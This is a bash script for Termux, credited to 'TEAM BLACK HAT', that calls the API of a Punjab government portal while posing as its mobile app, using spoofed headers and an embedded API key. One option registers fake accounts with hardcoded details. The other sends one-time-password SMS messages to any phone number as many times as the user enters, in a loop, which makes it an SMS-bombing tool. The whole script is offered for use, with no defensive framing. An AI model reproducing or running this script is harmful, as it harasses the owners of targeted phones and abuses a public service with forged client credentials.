
#!/data/data/com.termux/files/usr/bin/bash

# Show menu
echo "Choose an option:"
echo "1) Register New User"
echo "2) Regenerate OTP Multiple Times"
read -p "Enter choice [1 or 2]: " choice

# API Base URL
base_url="https://e-epd.punjab.gov.pk"

# Common Headers
headers=(
    -H "app: sans"
    -H "version: 28"
    -H "Content-Type: application/json; charset=UTF-8"
    -H "Host: e-epd.punjab.gov.pk"
    -H "Connection: Keep-Alive"
    -H "Accept-Encoding: gzip"
    -H "User-Agent: okhttp/4.5.0"
    --compressed
)

if [ "$choice" == "1" ]; then
    # Option 1: Register New User
    read -p "Enter Mobile Number: " mobile_number

    curl -X POST "$base_url/api/register"     "${headers[@]}"     -d '{
      "cnic": "",
      "email": "",
      "name": "Ali khan",
      "mobile_number": "'"$mobile_number"'",
      "password": "Abcd1234$@.",
      "user_type": "3",
      "apiKey": "cs3pqO4xW6zFsRH5kaLomFPJHsHdQrWe",
      "imei": "123",
      "latitude": "0.0",
      "longitude": "0.0",
      "versionCode": "3"
    }'

elif [ "$choice" == "2" ]; then
    # Option 2: Regenerate OTP
    read -p "Enter Mobile Number: " mobile_number
    read -p "How many times to send OTP? " otp_count

    for ((i=1; i<=otp_count; i++))
    do
        echo "Sending OTP #$i"
        curl -X POST "$base_url/api/sns_generate_mobile_otp"         "${headers[@]}"         -d '{
          "mobile_number": "'"$mobile_number"'"
        }'
        echo ""
        echo "----------------------------------------"
        echo "Developer: TEAM BLACK HAT"
        echo "----------------------------------------"
        echo "OLD-HACKER"
        sleep 1
    done

else
    echo "Invalid choice. Exiting."
fi
      
